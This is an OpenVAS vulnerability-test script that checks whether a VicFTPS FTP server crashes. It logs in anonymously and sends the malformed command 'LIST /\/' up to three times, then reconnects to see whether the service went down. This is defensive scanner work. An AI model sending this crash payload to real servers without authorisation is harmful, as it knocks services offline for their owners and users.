###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_vicftps_list_dos_vuln.nasl 9350 2018-04-06 07:03:33Z cfischer $
#
# VicFTPS LIST Command Denial of Service Vulnerability
#
# Authors:
# Nikita MR <rnikita@secpod.com>
#
# Copyright:
# Copyright (c) 2009 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation allows attackers to execute arbitrary
code, and can crash the affected application.

Impact Level: Application";

tag_affected = "VicFTPS Version 5.0 and prior on Windows.";

tag_insight = "A NULL pointer dereference error exists while processing
malformed arguments passed to a LIST command that starts with a '/\/' (forward
slash, backward slash, forward slash).";

tag_solution = "No solution or patch was made available for at least one year
since disclosure of this vulnerability. Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective
features, remove the product or replace the product by another one.";

tag_summary = "This host is running VicFTPS FTP Server which is prone to
Denial of Service Vulnerability.";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.900580");
  script_version("$Revision: 9350 $");
  script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:03:33 +0200 (Fri, 06 Apr 2018) $");
  script_tag(name:"creation_date", value:"2009-06-26 07:55:21 +0200 (Fri, 26 Jun 2009)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_cve_id("CVE-2008-6829", "CVE-2008-2031");
  script_bugtraq_id(28967);
  script_name("VicFTPS LIST Command Denial of Service Vulnerability");
  script_xref(name : "URL" , value : "http://milw0rm.com/exploits/6834");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/29943");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2009 SecPod");
  script_family("Denial of Service");
  script_dependencies("find_service.nasl");
  script_require_ports("Services/ftp", 21);
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  script_tag(name:"solution_type", value:"WillNotFix");
  exit(0);
}


include("ftp_func.inc");
include("version_func.inc");

vicPort = get_kb_item("Services/ftp");
if(!vicPort){
  vicPort = 21;
}

if(!get_port_state(vicPort)){
  exit(0);
}

if(safe_checks() || "VicFTPS" >!< get_ftp_banner(port:vicPort)){
  exit(0);
}

soc = open_sock_tcp(vicPort);
if(!soc){
  exit(0);
}

# Authenticate with anonymous user (Before crash)
if(!ftp_authenticate(socket:soc, user:"anonymous", pass:"anonymous")){
  exit(0);
}

for(i = 0; i < 3; i++)
{
  cmd = "LIST /\/";
  ftp_send_cmd(socket:soc, cmd:cmd);
  sleep(5);
  ftp_close(soc);

  # Check for VicFTPS Service Status
  soc = open_sock_tcp(vicPort);
  if(!soc)
  {
     security_message(vicPort);
     exit(0);
  }
  else
  {
    if(!ftp_authenticate(socket:soc, user:"anonymous", pass:"anonymous"))
    {
      security_message(vicPort);
      ftp_close(soc);
      exit(0);
    }
  }
}
